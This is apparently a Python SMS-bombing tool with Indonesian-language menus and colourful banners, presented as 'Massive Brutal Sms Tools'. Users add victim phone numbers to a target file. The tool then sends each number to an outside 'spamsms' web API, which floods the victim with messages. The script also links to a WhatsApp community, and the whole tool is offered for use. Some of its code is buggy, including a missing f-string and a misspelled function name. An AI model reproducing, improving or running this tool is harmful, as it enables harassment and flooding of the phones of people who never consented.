# Made With ❤️ Kucing0yen
# Powered By ExecutedTeam

import os,sys,time,requests,json,random
import itertools,threading
from colorama import Fore,init,Back

B = Fore.BLUE
W = Fore.WHITE
R = Fore.RED
G = Fore.GREEN
BL = Fore.BLACK
Y = Fore.YELLOW
Hijau="\033[1;92m"
putih="\033[1;97m"
abu="\033[1;90m"
kuning="\033[1;93m"
ungu="\033[1;95m"
biru="\033[1;96m"
#Tulisan Background Merah
bg="\033[1;0m\033[1;41mMassive Brutal Sms Tools\033[1;0m"

def printtik(s):
    for c in s + "\n":
        sys.stdout.write(c)
        sys.stdout.flush()
        time.sleep(1./100)

def tanya():
    tanya=input(f"[•] Main Lagi {biru}({W}y{abu}/{W}n{biru}){R}:{G} ")
    if tanya == "y" or tanya == "Y":
        banner2()
    if tanya == "n" or tanya == "N":
        printtik(f"{biru}Thx For {W}Using My {biru}Tools")
        os.system("exit")

def settings():
    sett=input(f"{W}Input Target {B}•{R}⟩{G} ")
    os.system("echo '{sett}' > list1.txt")
    os.system("mv target.txt list2.txt")
    os.system("cat list1.txt list2.txt > target.txt")
    tambah=input(f"{W}[{R}•{W}] Tambahkan Target Lagi {biru}({W}y{abu}/{W}n{biru}){R}:{G}")
    if tambah == "y" or tambah == "Y":
        settings()
    if tambah == "n" or tambah == "N":
        banner2()
    else:
        printik(f"{W}[{R}!{W}] Input Yang Benan Kack {R}!!!")
        time.sleep(4)
        banner2()

def start():
    gas = open('target.txt','r').readlines()
    for line in gas:
        sesion=line.strip()
        spm=requests.get("https://ainxbot-sms.herokuapp.com/api/spamsms",params={"phone":sesion}).text
        print (spm)

# Logo By Kucing0yen
def banner():
    os.system("clear")
    printtik(f"""
{R}⌜                                                            ⌝
   {ungu}╔╦╗{W}┌─┐┌─┐┌─┐  {biru}╔═╗{W}┌┬┐┌─┐ {abu}|-{R}»{biru}⟩ {W}Creator {R}:{W} AmmarBN
   {ungu}║║║{W}├─┤└─┐└─┐  {biru}╚═╗{W}│││└─┐ {abu}|-{R}»{biru}⟩ {W}Githubb {R}:{Y} github.com/AmmarrBN
   {ungu}╩ ╩{W}┴ ┴└─┘└─┘  {biru}╚═╝{W}┴ ┴└─┘ {abu}|-{R}»{biru}⟩ {G}Powered By Executed Team
{R}⌞                {Y}[{bg}{putih}{Y}]{R}                  ⌟""")

# Tambah Api Web Sama Massive Sendiri
def banner2():
    banner()
    printtik(f"""
{W}┬───{R}⟨{W}Menu{R}⟩{W}────────────────
{W}├─{ungu}⟩ {W}1{R}.{W}Spam Sms {W}({Y}Massive{W})
{W}├─{ungu}⟩ {W}2{R}.{W}Setting Target {R}({W}Atur Target{R})
{W}├─{ungu}⟩ {W}3{R}.{W}Remove Target {R}({W}Hapus Target{R})
{W}├─{ungu}⟩ {W}4{R}.{W}Join Komunitas {R}({G}WhatsApp{R})
{W}├─{ungu}⟩ {R}0{R}.{W}Exit {R}({W}Keluar{R})
{W}└─────────────────────────
""")
    mr_input=input(f"{W}Pilih {B}»{R}⟩{G} ")
    if mr_input=="1":
        start()
        tanya()
    if mr_input=="2":
        settings()
    if mr_input=="3":
        printtik(f"{W}[{Y}•••{W}] Removed Target{abu}...")
        os.system("rm list1.txt list2.txt target.txt")
        time.sleep(5)
        printtik(f"{W}[{G}✓{W}] Success Removed Target")
        tanya()
    if mr_input=="4":
        os.system("xdg-open https://chat.whatsapp.com/GRZoMoLPNJA22TR7WINpMY")
        tanya()
    if mr_input=="0":
        time.sleep(5)
        printtik(f"{W}[{R}!{W}] Exited With Program{abu}.....")

def pro():
        banner2()
done = False
def loading():
    for c in itertools.cycle(['\033[1;37m[\033[31m•\033[1;37m] Starting tools.     ', '\033[1;37m[\033[31m•\033[1;37m] sTarting tools..    ', '\033[1;37m[\033[31m•\033[1;37m] stArting tools...   ', '\033[1;37m[\033[31m•\033[1;37m] staRting tools....  ', '\033[1;37m[\033[31m•\033[1;37m] starTing tools..... ', '\033[1;37m[\033[31m•\033[1;37m] startIng tools......', '\033[1;37m[\033[31m•\033[1;37m] startiNg tools.      ', '\033[1;37m[\033[31m•\033[1;37m] startinG tools..     ', '\033[1;37m[\033[31m•\033[1;37m] starting Tools...   ', '\033[1;37m[\033[31m•\033[1;37m] starting tOols....   ', '\033[1;37m[\033[31m•\033[1;37m] starting toOls..... ', '\033[1;37m[\033[31m•\033[1;37m] starting tooLs.      ', '\033[1;37m[\033[31m•\033[1;37m] starting toolS..    ', '\033[1;37m[\033[31m•\033[1;37m] STARTING TOOLS...    ', '\033[1;37m[\033[31m•\033[1;37m] STARTING TOOLS....  ', '\033[1;37m[\033[31m•\033[1;37m] STARTING TOOLS..... ', '\033[1;37m[\033[31m•\033[1;37m] ']):
        if done:
            break
        sys.stdout.write('\r'+c)
        sys.stdout.flush()
        time.sleep(0.2)
    sys.stdout.write('\r              ')
    print ("                                                ")
    pro()
t = threading.Thread(target=loading)
t.start()

time.sleep(4.60)
done = True
